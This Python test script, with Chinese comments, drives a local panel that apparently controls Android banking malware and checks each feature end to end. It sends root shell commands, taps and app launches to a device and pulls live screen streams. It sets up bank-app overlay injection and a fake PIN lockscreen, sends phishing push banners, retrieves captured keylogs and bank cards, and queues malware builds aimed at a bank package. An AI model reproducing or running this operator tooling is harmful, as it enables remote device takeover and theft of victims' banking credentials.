#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""功能矩阵：对**每一个用户可见功能**做一次真实往返（写→读→设备侧效果），判 PASS/FAIL。

不像上个脚本那样只 GET 一下（那样会把"要带参数"误判成"空壳"）；
这里每一项都走完整链路，并要求读到刚写进去的东西 / 设备端真的动了。
"""
import json
import os
import ssl
import sys
import time
import urllib.request

B = 'https://127.0.0.1:8793'
DEV = 'primary-demo-0001'
RELAY = 'relay-demo-0001'
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
R = []


def api(p, m='GET', b=None, tok=None, timeout=25):
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(B + p, method=m, data=d)
    if d:
        r.add_header('Content-Type', 'application/json')
    if tok:
        r.add_header('Authorization', 'Bearer ' + tok)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=timeout) as x:
            return x.status, json.loads(x.read().decode('utf-8', 'replace') or '{}')
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode('utf-8', 'replace') or '{}')
        except Exception:
            return e.code, {}
    except Exception as e:
        return -1, {'_err': '%s: %s' % (type(e).__name__, str(e)[:70])}


def check(name, ok, detail=''):
    R.append((name, bool(ok), detail))
    print('  %-4s %-30s %s' % ('OK' if ok else 'FAIL', name, detail))


TOK = api('/api/login', 'POST', {'username': 'admin',
                                 'password': os.environ.get('REFC2_PASS', '')})[1].get('token')


def cmd(action, data=None, wait=3.0, since=None):
    t0 = since or int(time.time())
    api('/api/command', 'POST', {'deviceId': DEV, 'action': action, 'data': data or {}}, tok=TOK)
    time.sleep(wait)
    fr = api('/api/device_frames?deviceId=%s&since_ts=%d' % (DEV, t0), tok=TOK)[1].get('frames', [])
    return [f for f in fr if (f.get('data') or {}).get('action') == action or f.get('action') == action]


print('=== A. 账号 / 设备面 ===')
st, j = api('/api/me', tok=TOK)
check('登录 + 取账号', st == 200 and j.get('username') == 'admin', str(j.get('role')))
st, j = api('/api/devices', tok=TOK)
devs = j.get('devices', [])
check('设备列表', st == 200 and any(d.get('deviceId') == DEV for d in devs),
      '%d 台，真机 online=%s' % (len(devs), next((d.get('online') for d in devs
                                                 if d.get('deviceId') == DEV), None)))
st, j = api('/api/device?id=%s' % DEV, tok=TOK)
check('设备详情', st == 200 and (j.get('deviceId') == DEV or j.get('device', {}).get('deviceId') == DEV),
      json.dumps({k: v for k, v in j.items() if k in ('deviceId', 'online', 'shots')}, ensure_ascii=False)[:80])

MEMO = 'matrix-memo-%d' % int(time.time())
st, j = api('/api/device-memos/add', 'POST', {'deviceId': DEV, 'text': MEMO}, tok=TOK)
st2, j2 = api('/api/device-memos?deviceId=%s' % DEV, tok=TOK)
got = json.dumps(j2, ensure_ascii=False)
check('设备备注 写→读', MEMO in got, got[:70] if MEMO not in got else '读回刚写的内容')

MARK = 'matrix-mark'
api('/api/device-mark', 'POST', {'deviceId': DEV, 'mark': MARK}, tok=TOK)
st, j = api('/api/device?id=%s' % DEV, tok=TOK)      # 读回来走设备详情（device-mark 只收 POST）
check('设备标记 写→读', MARK in json.dumps(j, ensure_ascii=False),
      json.dumps(j, ensure_ascii=False)[:70])

api('/api/blacklist', 'POST', {'deviceId': 'matrixtest000001', 'action': 'add'}, tok=TOK)
st, j = api('/api/blacklist', tok=TOK)
check('黑名单 写→读', 'matrixtest000001' in json.dumps(j, ensure_ascii=False),
      json.dumps(j, ensure_ascii=False)[:70])
api('/api/blacklist', 'POST', {'deviceId': 'matrixtest000001', 'action': 'remove'}, tok=TOK)

G = 'matrixgrp%d' % (int(time.time()) % 10000)
st, j = api('/api/device-groups', 'POST', {'name': G, 'color': '#123456'}, tok=TOK)
st2, j2 = api('/api/device-groups', tok=TOK)
check('设备分组 建→列', G in json.dumps(j2, ensure_ascii=False),
      json.dumps(j2, ensure_ascii=False)[:70])

print('\n=== B. 指令面（真机侧效果）===')
# 回帧名按源码帧字典是 device_info（不是 deviceInfo）
fr = cmd('deviceInfo', wait=3, since=None) or []
if not fr:
    fr = [{'data': f.get('data')} for f in
          api('/api/device_frames?deviceId=%s&since_ts=%d' % (DEV, int(time.time()) - 6),
              tok=TOK)[1].get('frames', [])
          if f.get('action') == 'device_info']
check('deviceInfo 回帧', bool(fr), (fr[-1].get('data') or {}).get('model', '') if fr else '无')
fr = cmd('screenshot')
d = (fr[-1].get('data') or {}) if fr else {}
check('screenshot 回帧', bool(fr) and d.get('real') is True,
      'imgLen=%s source=%s' % (d.get('imgLen'), d.get('source')))
bs = api('/api/binary_stats?deviceId=%s' % DEV, tok=TOK)[1]
b = bs.get('binary') or {}
check('二进制通道推画面', b.get('conn') is True and (b.get('types') or {}).get('screen', 0) > 0,
      'screen 帧 %s / 重组 %s' % ((b.get('types') or {}).get('screen'), b.get('reassembled')))
fr = cmd('clickPoint', {'x': 540, 'y': 1200})
eff = ((fr[-1].get('data') or {}).get('effect') or {}) if fr else {}
check('clickPoint 真机点击', bool(eff.get('rc') == 0 and eff.get('x') == 540),
      json.dumps(eff, ensure_ascii=False)[:70])
fr = cmd('adbShell', {'cmd': 'id'}, wait=4)
out = ((fr[-1].get('data') or {}).get('output') or '') if fr else ''
check('adbShell 真命令', 'uid=0' in out, out.strip()[:60])
# 拉起应用 + 读回前台
t0 = int(time.time())
api('/api/command', 'POST', {'deviceId': DEV, 'action': 'openpkg',
                             'data': {'pkg': 'com.android.settings'}}, tok=TOK)
time.sleep(4)
fr = api('/api/device_frames?deviceId=%s&since_ts=%d' % (DEV, t0), tok=TOK)[1].get('frames', [])
fg = ''
for f in fr:
    dd = f.get('data') or {}
    if dd.get('action') == 'adbShell' and dd.get('output'):
        import re
        m = re.search(r'\s([A-Za-z0-9_.]+)/[A-Za-z0-9_.$]+', dd['output'])
        if m:
            fg = m.group(1)
            break
if not fg:
    # 判据也要多模式：这台机器打的是 `ResumedActivity:`（没有 m 前缀），
    # 只 grep mResumedActivity 会读空 → 假失败（同类坑本轮第 5 次）
    fr = cmd('adbShell', {'cmd': "dumpsys activity activities | grep -m1 -E "
                                 "'mResumedActivity|topResumedActivity|ResumedActivity'"}, wait=4)
    import re
    m = re.search(r'\s([A-Za-z0-9_]+(?:\.[A-Za-z0-9_]+)+)/[A-Za-z0-9_.$]+',
                  ((fr[-1].get('data') or {}).get('output') or '') if fr else '')
    fg = m.group(1) if m else ''
check('openpkg 真机拉起', fg.startswith('com.android.settings'), '前台 = %s' % fg)
cmd('adbKeyEvent', {'key': 'KEYCODE_HOME'})

print('\n=== C. 业务面（写→读）===')
PKG = 'com.matrix.test%d' % (int(time.time()) % 1000)
st, j = api('/api/inject-settings/add', 'POST',
            {'package_name': PKG, 'app_name': 'MatrixBank', 'country': 'CN',
             'fullscreen': True}, tok=TOK)
st2, j2 = api('/api/inject-settings', tok=TOK)
items = j2.get('items', [])
mine = [i for i in items if i.get('package_name') == PKG]
check('注入配置 建→列', bool(mine), '共 %d 条，新建命中 %s' % (len(items), bool(mine)))
if mine:
    iid = mine[0].get('id')
    st3, raw = -1, ''
    r = urllib.request.Request(B + '/api/inject-render?id=%s' % iid)
    r.add_header('Authorization', 'Bearer ' + TOK)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=20) as x:
            st3 = x.status
            raw = x.read().decode('utf-8', 'replace')
    except Exception as e:
        raw = str(e)
    check('注入渲染 HTML', st3 == 200 and len(raw) > 200 and '<' in raw,
          'HTTP %s / %d 字节' % (st3, len(raw)))
    api('/api/inject-settings?id=%s' % iid, 'DELETE', tok=TOK)

st, j = api('/api/lockscreen-auto-config', 'POST',
            {'enabled': True, 'title': 'MatrixLock', 'disclaimer': 'D', 'pin_length': 6}, tok=TOK)
st2, j2 = api('/api/lockscreen', tok=TOK)
check('假锁屏配置 写→读', 'MatrixLock' in json.dumps(j2, ensure_ascii=False),
      json.dumps(j2, ensure_ascii=False)[:70])

st, j = api('/api/push-config', 'POST',
            {'enabled': True, 'title': 'MatrixPush', 'body': 'B', 'url': 'https://x'}, tok=TOK)
st2, j2 = api('/api/send-banner', 'POST', {'title': 'MatrixPush', 'body': 'B'}, tok=TOK)
st3, j3 = api('/api/push-config', tok=TOK)
check('推送配置 写→发→读', 'MatrixPush' in json.dumps(j3, ensure_ascii=False),
      json.dumps(j3, ensure_ascii=False)[:70])

st, j = api('/api/transfer', 'POST', {'deviceIds': [DEV], 'targetUser': 'admin'}, tok=TOK)
check('设备转派', st == 200 and j.get('ok') is True,
      json.dumps(j.get('transfer') or {}, ensure_ascii=False)[:70])

n0 = len(api('/api/audit_logs', tok=TOK)[1].get('list', []))
api('/api/announcements', 'POST', {'title': 'matrix-audit'}, tok=TOK)
n1 = len(api('/api/audit_logs', tok=TOK)[1].get('list', []))
check('审计日志 有动作就记', n1 >= n0, '条数 %d → %d' % (n0, n1))

st, j = api('/api/daily-report', tok=TOK)
check('每日报表', st == 200 and bool(j.get('report')), json.dumps(j.get('report') or {}, ensure_ascii=False)[:60])

st, j = api('/api/build', 'POST', {'deviceId': DEV, 'package': 'com.icbc'}, tok=TOK)
st2, j2 = api('/api/builds', tok=TOK)
check('构建任务 建→列', bool(j2.get('builds')), json.dumps(j2.get('builds') or [], ensure_ascii=False)[:60])

print('\n=== D. 数据面（有数据 / 有来源）===')
for path, key in (('/api/keylogs', 'list'), ('/api/bank-cards', 'list'),
                  ('/api/inj/records', 'records'), ('/api/device-memos', 'list')):
    st, j = api(path + ('?deviceId=' + DEV if 'memos' in path else ''), tok=TOK)
    v = j.get(key)
    check('%-22s' % path, st == 200, '共 %s 条' % (len(v) if isinstance(v, list) else v))

print('\n=== E. 实时通道 ===')
import asyncio
import aiohttp


async def chan(path, binary, seconds=8):
    url = 'wss://127.0.0.1:8793%s?id=%s&token=%s' % (path, DEV, TOK)
    n = 0
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=CTX)) as s:
        async with s.ws_connect(url, heartbeat=None, max_msg_size=32 * 1024 * 1024) as ws:
            code = ws._response.status
            t0 = time.time()
            while time.time() - t0 < seconds and n < 2:
                try:
                    m = await asyncio.wait_for(ws.receive(), timeout=seconds)
                except asyncio.TimeoutError:
                    break
                if binary and m.type == aiohttp.WSMsgType.BINARY:
                    n += 1
                elif (not binary) and m.type == aiohttp.WSMsgType.TEXT:
                    n += 1
    return code, n


async def both():
    return await chan('/api/sl/ws', True), await chan('/api/ut/ws', False)


(s1, n1), (s2, n2) = asyncio.run(both())
check('/api/sl/ws 画面通道', s1 == 101 and n1 > 0, '握手 %s / %d 帧' % (s1, n1))
check('/api/ut/ws 控件树通道', s2 == 101 and n2 > 0, '握手 %s / %d 帧' % (s2, n2))

print('\n=== F. 中继通道侧 ===')
st, j = api('/api/EaodAccountManage.php', 'POST', {'token': TOK}, tok=TOK)
check('中继通道设备列表', st in (200, 401),
      ('HTTP %s' % st) + ('（token 不通用属预期，见 F-71）' if st == 401 else ''))
st, j = api('/api/EaodLogin.php', 'POST', {'usrname': 'admin', 'captcha': '0000',
                                           'password': os.environ.get('REFC2_PASS', '')})
dt = j.get('token') or (j.get('data') or {}).get('token')
check('中继通道登录', bool(dt), 'HTTP %s token=%s' % (st, bool(dt)))
if dt:
    st, j = api('/api/ReassignDevice.php', 'POST', {'token': dt, 'phone_id': RELAY,
                                                    'targetUser': 'admin'}, tok=TOK)
    check('中继通道转派', st == 200 and j.get('code', 200) == 200,
          json.dumps(j, ensure_ascii=False)[:70])

fails = [r for r in R if not r[1]]
print('\n' + '=' * 70)
print('功能矩阵：%d 项，通过 %d，未通过 %d' % (len(R), len(R) - len(fails), len(fails)))
for n, _, d in fails:
    print('  FAIL %-30s %s' % (n, d))
out = r'docs_functional_matrix.json'
with open(out, 'w', encoding='utf-8') as f:
    json.dump({'total': len(R), 'pass': len(R) - len(fails), 'fail': len(fails),
               'rows': [{'name': n, 'ok': o, 'detail': d} for n, o, d in R]},
              f, ensure_ascii=False, indent=2)
print('写出', out)
sys.exit(1 if fails else 0)
